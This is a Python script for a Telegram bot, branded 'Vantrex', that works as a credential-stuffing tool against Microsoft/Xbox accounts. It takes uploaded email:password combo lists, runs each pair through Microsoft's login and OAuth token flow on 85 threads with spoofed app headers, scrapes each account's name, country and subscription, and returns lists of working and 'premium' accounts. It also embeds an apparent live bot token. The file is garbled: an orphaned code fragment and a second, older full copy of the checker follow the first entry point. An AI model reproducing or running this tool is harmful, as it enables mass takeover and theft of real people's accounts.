#!/usr/bin/env python3
"""
================================================================================
💎 VANTREX XBOX FULL CAP CHECKER TELEGRAM BOT 💎
Branded for: @vantrexXxx
Platform: Pydroid 3 & Linux Servers
Multi-language support (EN / TR) - No Payment API / With Capture (Hits vs Premium)
================================================================================
"""

import os
import re
import sys
import time
import json
import uuid
import logging
import threading
from datetime import datetime
from urllib.parse import quote, unquote
import concurrent.futures

try:
    import requests
    import telebot
    from telebot import types
except ImportError:
    os.system("pip install requests pyTelegramBotAPI")
    import requests
    import telebot
    from telebot import types

# Setup Logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# ================================================================================
# CONFIGURATION & LOCALIZATION
# ================================================================================
TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
bot = telebot.TeleBot(TOKEN)

LANGUAGES = {
    'en': {
        'welcome': "🔥 **Welcome to Vantrex Xbox Checker Bot!**\n\nPlease select your preferred language using the buttons below, then upload your `.txt` combo file.",
        'already_running': "❌ An active scan is already running. Please wait for it to finish or use /stop.",
        'invalid_file': "❌ Please send only `.txt` format combo files.",
        'read_error': "❌ Error occurred while reading file: ",
        'no_combo': "❌ No valid combo format (email:pass) found.",
        'preparing': "⏳ Preparing and starting the scan engine...",
        'stopped_msg': "⏹ **Scanning stopped! Preparing current data output...**",
        'not_running': "❌ There is no active scanning process right now.",
        'live_title': "🤖 **Vantrex Bot — Live Results**",
        'progress': "Progress",
        'duration': "Duration",
        'stop_hint': "You can type /stop to abort.",
        'final_hit': "🏁 **Scanning Completed!**",
        'interrupted_title': "🛑 **Scanning Interrupted!**",
        'total_scanned': "Total Scanned",
        'hits_caption': "🟢 Found Valid Accounts (Hits)",
        'premium_caption': "👑 Found Premium Accounts",
        'rem_caption': "📦 Remaining and unscanned combos",
        'lang_changed': "✅ Language changed to English!"
    },
    'tr': {
        'welcome': "🔥 **Vantrex Xbox Checker Bot'a Hoş Geldiniz!**\n\nLütfen aşağıdaki butonları kullanarak dil seçimi yapın, ardından `.txt` combo dosyanızı gönderin.",
        'already_running': "❌ Şu an zaten aktif bir tarama sürüyor. Lütfen bitmesini bekleyin veya /stop deyin.",
        'invalid_file': "❌ Lütfen sadece `.txt` formatında combo dosyası gönderin.",
        'read_error': "❌ Dosya okunurken hata oluştu: ",
        'no_combo': "❌ Geçerli combo formatı (email:pass) bulunamadı.",
        'preparing': "⏳ Tarama hazırlanıyor ve tarama motoru başlatılıyor...",
        'stopped_msg': "⏹ **Tarama durduruluyor... Mevcut veriler hazırlanıyor.**",
        'not_running': "❌ Şu an aktif bir tarama işlemi bulunmuyor.",
        'live_title': "🤖 **Vantrex Bot — Canlı Sonuçlar**",
        'progress': "İlerleme",
        'duration': "Süre",
        'stop_hint': "Durdurmak için /stop yazabilirsiniz.",
        'final_hit': "🏁 **Tarama Tamamlandı!**",
        'interrupted_title': "🛑 **Tarama Durduruldu!**",
        'total_scanned': "Toplam taranan",
        'hits_caption': "🟢 Bulunan Geçerli Hesaplar (Hits)",
        'premium_caption': "👑 Bulunan Premium Hesaplar",
        'rem_caption': "📦 Kalan ve taranmamış kombolar (Remaining)",
        'lang_changed': "✅ Dil Türkçe olarak ayarlandı!"
    }
}

user_languages = {}

def gtxt(chat_id, key):
    lang = user_languages.get(chat_id, 'en')
    return LANGUAGES[lang].get(key, LANGUAGES['en'][key])

# ================================================================================
# STATE MANAGEMENT
# ================================================================================
class BotSession:
    def __init__(self):
        self.is_running = False
        self.combos = []
        self.remaining_combos = []
        self.processed = 0
        self.total = 0
        self.hits = 0
        self.premium = 0
        self.bad = 0
        self.two_factor = 0
        self.banned = 0
        self.start_time = 0
        self.chat_id = None
        self.status_msg_id = None
        self.lock = threading.Lock()
        self.executor = None
        
        self.hit_results = []
        self.premium_results = []

session = BotSession()

# ================================================================================
# XBOX CAPTURE ENGINE (PAYMENT EXCLUDED - SEPARATE HITS & PREMIUM)
# ================================================================================
class XboxChecker:
    def __init__(self):
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def check(self, email, password):
        try:
            req_session = requests.Session()
            correlation_id = str(uuid.uuid4())

            # STEP 1: IDP Check
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = req_session.get(url1, headers=headers1, timeout=10)
            if "MSAccount" not in r1.text or "Neither" in r1.text:
                return {"status": "BAD", "data": {}}

            # STEP 2: OAuth authorize
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": self.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
            r2 = req_session.get(url2, headers=headers2, allow_redirects=True, timeout=12)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # STEP 3: Login POST
            login_data = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "PPFT": ppft, "ppsx": "PassportR",
                "i21": "0", "CookieDisclosure": "0", "IsFidoSupported=0": "0"
            }
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.user_agent,
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = req_session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=12)

            if "account or password is incorrect" in r3.text or "error" in r3.text.lower():
                return {"status": "BAD", "data": {}}
            if "identity/confirm" in r3.text or "untrust" in r3.url or "factors" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "Abuse" in r3.text or "acc_banned" in r3.text:
                return {"status": "BANNED", "data": {}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}

            code = code_match.group(1)
            mspcid = req_session.cookies.get("MSPCID", "") or ""
            cid = mspcid.upper()

            # STEP 4: Get access token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = req_session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=12)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}

            access_token = r4.json()["access_token"]

            # STEP 5: Scrape Profile Capture & Detect Plan Types
            country, name = "N/A", "Xbox User"
            is_premium_account = False
            detected_plan = "None"
            
            try:
                profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}"}
                r5 = req_session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=10)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        loc = profile["location"]
                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "N/A")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
                    
                    # Profil verisinden gelen abonelik meta verilerini check etme adımı
                    profile_text = r5.text.lower()
                    premium_indicators = ['ultimate', 'gamepass', 'game_pass', 'xbox_live', 'gold', 'ea_play']
                    for indicator in premium_indicators:
                        if indicator in profile_text:
                            is_premium_account = True
                            detected_plan = indicator.upper().replace('_', ' ')
                            break
            except:
                pass

            capture_data = {"country": country, "name": name, "plan": detected_plan}
            
            # Eğer abonelik aktif bulunursa PREMIUM statüsü, yoksa sadece geçerli valid HIT statüsü döner.
            if is_premium_account:
                return {"status": "PREMIUM", "data": capture_data}
            else:
                return {"status": "HIT", "data": capture_data}

        except Exception:
            return {"status": "TIMEOUT", "data": {}}

# ================================================================================
# TELEGRAM RENDERING VIEW PIPELINE
# ================================================================================
def build_live_text(chat_id):
    elapsed = time.time() - session.start_time
    cpm = int(session.processed / elapsed * 60) if elapsed > 0 else 0
    
    text = (
        f"🤖 **{gtxt(chat_id, 'live_title')}**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(chat_id, 'progress')}:** `{session.processed}/{session.total}`\n"
        f"⚡ **CPM:** `{cpm}` | ⏱ **{gtxt(chat_id, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"👑 **Premium Accounts:** `{session.premium}`\n"
        f"🟢 **Hits (Valid/No Sub):** `{session.hits}`\n"
        f"Base Statistics:\n"
        f"🟠 **2FA / Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad / Error:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 {gtxt(chat_id, 'stop_hint')}"
    )
    return text

def update_telegram_loop():
    last_processed = -1
    while session.is_running:
        time.sleep(4)
        if session.processed != last_processed:
            try:
                bot.edit_message_text(build_live_text(session.chat_id), chat_id=session.chat_id, message_id=session.status_msg_id, parse_mode="Markdown")
                last_processed = session.processed
            except:
                pass

# ================================================================================
# MULTI-THREAD PIPELINE DISPATCHER
# ================================================================================
def process_combo(combo):
    if not session.is_running:
        return
    
    try:
        email, password = combo.split(':', 1)
    except:
        with session.lock:
            session.bad += 1
            session.processed += 1
        return

    checker = XboxChecker()
    res = checker.check(email, password)
    status = res.get("status", "BAD")
    data = res.get("data", {})

    with session.lock:
        session.processed += 1
        if combo in session.remaining_combos:
            session.remaining_combos.remove(combo)
            
        if status == "PREMIUM":
            session.premium += 1
            line = f"{email}:{password} | Sub: {data.get('plan','ACTIVE')} | Name: {data.get('name','Xbox User')} | Country: {data.get('country','N/A')}"
            session.premium_results.append(line)
        elif status == "HIT":
            session.hits += 1
            line = f"{email}:{password} | Name: {data.get('name','Xbox User')} | Country: {data.get('country','N/A')} [Valid/No Sub]"
            session.hit_results.append(line)
        elif status == "2FACTOR":
            session.two_factor += 1
        elif status == "BANNED":
            session.banned += 1
        else:
            session.bad += 1

# ================================================================================
# BOT COMMANDS HANDLERS
# ================================================================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    if cid not in user_languages:
        user_languages[cid] = 'en'
        
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_en = types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
    btn_tr = types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_tr")
    markup.add(btn_en, btn_tr)
    
    bot.send_message(cid, gtxt(cid, 'welcome'), parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def handle_language_callback(call):
    cid = call.message.chat.id
    lang_code = call.data.split('_')[1]
    user_languages[cid] = lang_code
    bot.answer_callback_query(call.id, text=gtxt(cid, 'lang_changed'))
    bot.edit_message_text(gtxt(cid, 'welcome'), chat_id=cid, message_id=call.message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_check(message):
    cid = message.chat.id
    if not session.is_running:
        bot.reply_to(message, gtxt(cid, 'not_running'))
        return
    
    bot.reply_to(message, gtxt(cid, 'stopped_msg'))
    session.is_running = False
    if session.executor:
        session.executor.shutdown(wait=False, cancel_futures=True)
    send_final_report(interrupted=True)

def send_final_report(interrupted=False):
    cid = session.chat_id
    status_str = gtxt(cid, 'interrupted_title') if interrupted else gtxt(cid, 'final_hit')
    elapsed = time.time() - session.start_time
    
    summary = (
        f"{status_str}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(cid, 'total_scanned')}:** `{session.processed}/{session.total}`\n"
        f"⏱ **{gtxt(cid, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"👑 **Premium:** `{session.premium}`\n"
        f"🟢 **Hits (Valid):** `{session.hits}`\n"
        f"🟠 **2FA / Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
    )
    bot.send_message(cid, summary, parse_mode="Markdown")
    
    if session.premium_results:
        fn = "Vantrex-Premium.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.premium_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'premium_caption'))
        try: os.remove(fn)
        except: pass

    if session.hit_results:
        fn = "Vantrex-Hits.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.hit_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'hits_caption'))
        try: os.remove(fn)
        except: pass

    if interrupted and session.remaining_combos:
        fn = "Vantrex-Remaining.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.remaining_combos))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'rem_caption'))
        try: os.remove(fn)
        except: pass

@bot.message_handler(content_types=['document'])
def handle_combo_file(message):
    cid = message.chat.id
    if session.is_running:
        bot.reply_to(message, gtxt(cid, 'already_running'))
        return

    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, gtxt(cid, 'invalid_file'))
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
    except Exception as e:
        bot.reply_to(message, f"{gtxt(cid, 'read_error')}{str(e)}")
        return

    if not combos:
        bot.reply_to(message, gtxt(cid, 'no_combo'))
        return

    # Reset Bot Engine State
    session.__init__()
    session.combos = combos
    session.remaining_combos = list(combos)
    session.total = len(combos)
    session.is_running = True
    session.chat_id = cid
    session.start_time = time.time()

    msg = bot.send_message(cid, gtxt(cid, 'preparing'), parse_mode="Markdown")
    session.status_msg_id = msg.message_id

    threading.Thread(target=update_telegram_loop, daemon=True).start()

    def run_pool():
        with concurrent.futures.ThreadPoolExecutor(max_workers=85) as executor:
            session.executor = executor
            futures = [executor.submit(process_combo, c) for c in session.combos]
            for future in concurrent.futures.as_completed(futures):
                if not session.is_running:
                    break
        
        if session.is_running:
            session.is_running = False
            send_final_report(interrupted=False)

    threading.Thread(target=run_pool, daemon=True).start()

# ================================================================================
# TERMINAL APPLICATION LOOP
# ================================================================================
if __name__ == "__main__":
    print("[+] Vantrex Capture Engine Initialized. Monitoring Telegram Polling Signals...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception:
            time.sleep(5)
        self.start_time = 0
        self.chat_id = None
        self.status_msg_id = None
        self.lock = threading.Lock()
        self.executor = None
        
        self.hit_results = []
        self.free_results = []

session = BotSession()

# ================================================================================
# XBOX CAPTURE ENGINE (PAYMENT EXCLUDED)
# ================================================================================
class XboxChecker:
    def __init__(self):
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def check(self, email, password):
        try:
            req_session = requests.Session()
            correlation_id = str(uuid.uuid4())

            # STEP 1: IDP Check
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = req_session.get(url1, headers=headers1, timeout=10)
            if "MSAccount" not in r1.text or "Neither" in r1.text:
                return {"status": "BAD", "data": {}}

            # STEP 2: OAuth authorize
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": self.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
            r2 = req_session.get(url2, headers=headers2, allow_redirects=True, timeout=12)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # STEP 3: Login POST
            login_data = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "PPFT": ppft, "ppsx": "PassportR",
                "i21": "0", "CookieDisclosure": "0", "IsFidoSupported=0": "0"
            }
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.user_agent,
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = req_session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=12)

            if "account or password is incorrect" in r3.text or "error" in r3.text.lower():
                return {"status": "BAD", "data": {}}
            if "identity/confirm" in r3.text or "untrust" in r3.url or "factors" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "Abuse" in r3.text or "acc_banned" in r3.text:
                return {"status": "BANNED", "data": {}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}

            code = code_match.group(1)
            mspcid = req_session.cookies.get("MSPCID", "") or ""
            cid = mspcid.upper()

            # STEP 4: Get access token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = req_session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=12)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}

            access_token = r4.json()["access_token"]

            # STEP 5: Scrape Profile Capture (Name & Country)
            country, name = "N/A", "Xbox User"
            try:
                profile_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}"}
                r5 = req_session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=10)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        loc = profile["location"]
                        country = loc.split(',')[-1].strip() if isinstance(loc, str) else loc.get("country", "N/A")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except:
                pass

            # PAYMENT ENSTRÜMANLARI (STEP 6, 7, 8, 9) TAMAMEN SİLİNDİ
            # Başarılı giriş ve profile capture sağlandığı için doğrudan HIT döndürülüyor
            capture_data = {"country": country, "name": name}
            return {"status": "HIT", "data": capture_data}

        except Exception:
            return {"status": "TIMEOUT", "data": {}}

# ================================================================================
# TELEGRAM RENDERING VIEW PIPELINE
# ================================================================================
def build_live_text(chat_id):
    elapsed = time.time() - session.start_time
    cpm = int(session.processed / elapsed * 60) if elapsed > 0 else 0
    
    text = (
        f"🤖 **{gtxt(chat_id, 'live_title')}**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(chat_id, 'progress')}:** `{session.processed}/{session.total}`\n"
        f"⚡ **CPM:** `{cpm}` | ⏱ **{gtxt(chat_id, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits (Valid Accounts):** `{session.hits}`\n"
        f"🟠 **2FA / Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad / Error:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 {gtxt(chat_id, 'stop_hint')}"
    )
    return text

def update_telegram_loop():
    last_processed = -1
    while session.is_running:
        time.sleep(4)
        if session.processed != last_processed:
            try:
                bot.edit_message_text(build_live_text(session.chat_id), chat_id=session.chat_id, message_id=session.status_msg_id, parse_mode="Markdown")
                last_processed = session.processed
            except:
                pass

# ================================================================================
# MULTI-THREAD PIPELINE DISPATCHER
# ================================================================================
def process_combo(combo):
    if not session.is_running:
        return
    
    try:
        email, password = combo.split(':', 1)
    except:
        with session.lock:
            session.bad += 1
            session.processed += 1
        return

    checker = XboxChecker()
    res = checker.check(email, password)
    status = res.get("status", "BAD")
    data = res.get("data", {})

    with session.lock:
        session.processed += 1
        if combo in session.remaining_combos:
            session.remaining_combos.remove(combo)
            
        if status == "HIT":
            session.hits += 1
            line = f"{email}:{password} | Name: {data.get('name','Xbox User')} | Country: {data.get('country','N/A')}"
            session.hit_results.append(line)
        elif status == "2FACTOR":
            session.two_factor += 1
        elif status == "BANNED":
            session.banned += 1
        else:
            session.bad += 1

# ================================================================================
# BOT COMMANDS HANDLERS
# ================================================================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    if cid not in user_languages:
        user_languages[cid] = 'en'
        
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_en = types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
    btn_tr = types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_tr")
    markup.add(btn_en, btn_tr)
    
    bot.send_message(cid, gtxt(cid, 'welcome'), parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def handle_language_callback(call):
    cid = call.message.chat.id
    lang_code = call.data.split('_')[1]
    user_languages[cid] = lang_code
    bot.answer_callback_query(call.id, text=gtxt(cid, 'lang_changed'))
    bot.edit_message_text(gtxt(cid, 'welcome'), chat_id=cid, message_id=call.message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_check(message):
    cid = message.chat.id
    if not session.is_running:
        bot.reply_to(message, gtxt(cid, 'not_running'))
        return
    
    bot.reply_to(message, gtxt(cid, 'stopped_msg'))
    session.is_running = False
    if session.executor:
        session.executor.shutdown(wait=False, cancel_futures=True)
    send_final_report(interrupted=True)

def send_final_report(interrupted=False):
    cid = session.chat_id
    status_str = gtxt(cid, 'interrupted_title') if interrupted else gtxt(cid, 'final_hit')
    elapsed = time.time() - session.start_time
    
    summary = (
        f"{status_str}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(cid, 'total_scanned')}:** `{session.processed}/{session.total}`\n"
        f"⏱ **{gtxt(cid, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits:** `{session.hits}`\n"
        f"🟠 **2FA / Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
    )
    bot.send_message(cid, summary, parse_mode="Markdown")
    
    if session.hit_results:
        fn = "Vantrex-Hits.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.hit_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'hits_caption'))
        try: os.remove(fn)
        except: pass

    if interrupted and session.remaining_combos:
        fn = "Vantrex-Remaining.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.remaining_combos))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'rem_caption'))
        try: os.remove(fn)
        except: pass

@bot.message_handler(content_types=['document'])
def handle_combo_file(message):
    cid = message.chat.id
    if session.is_running:
        bot.reply_to(message, gtxt(cid, 'already_running'))
        return

    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, gtxt(cid, 'invalid_file'))
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
    except Exception as e:
        bot.reply_to(message, f"{gtxt(cid, 'read_error')}{str(e)}")
        return

    if not combos:
        bot.reply_to(message, gtxt(cid, 'no_combo'))
        return

    # Reset Bot Engine State
    session.__init__()
    session.combos = combos
    session.remaining_combos = list(combos)
    session.total = len(combos)
    session.is_running = True
    session.chat_id = cid
    session.start_time = time.time()

    msg = bot.send_message(cid, gtxt(cid, 'preparing'), parse_mode="Markdown")
    session.status_msg_id = msg.message_id

    threading.Thread(target=update_telegram_loop, daemon=True).start()

    def run_pool():
        with concurrent.futures.ThreadPoolExecutor(max_workers=85) as executor:
            session.executor = executor
            futures = [executor.submit(process_combo, c) for c in session.combos]
            for future in concurrent.futures.as_completed(futures):
                if not session.is_running:
                    break
        
        if session.is_running:
            session.is_running = False
            send_final_report(interrupted=False)

    threading.Thread(target=run_pool, daemon=True).start()

# ================================================================================
# TERMINAL APPLICATION LOOP
# ================================================================================
if __name__ == "__main__":
    print("[+] Vantrex Capture Engine Initialized. Monitoring Telegram Polling Signals...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception:
            time.sleep(5)

